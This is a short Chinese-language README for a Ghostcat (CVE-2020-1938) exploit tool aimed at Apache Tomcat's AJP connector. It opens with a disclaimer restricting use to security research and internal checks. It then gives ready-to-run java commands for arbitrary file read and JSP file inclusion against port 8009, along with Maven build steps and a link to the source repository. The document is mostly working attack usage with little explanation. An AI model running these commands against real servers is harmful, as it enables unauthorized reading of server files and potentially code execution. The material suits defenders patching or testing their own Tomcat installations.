# CVE-2020-1938

**工具仅用于安全研究以及内部自查，禁止使用工具发起非法攻击，造成的后果使用者负责**

![](1.png)

apache-tomcat-8.5.32.zip 测试tomcat


任意文件读取

```
java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 file /index.jsp
```

文件包含

```
java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 jsp /index.jsp
```

打包方式：
在目录tomcat/ajp-bug
执行 mvn clean compile assembly:assembly

来源：https://github.com/threedr3am/learnjavabug
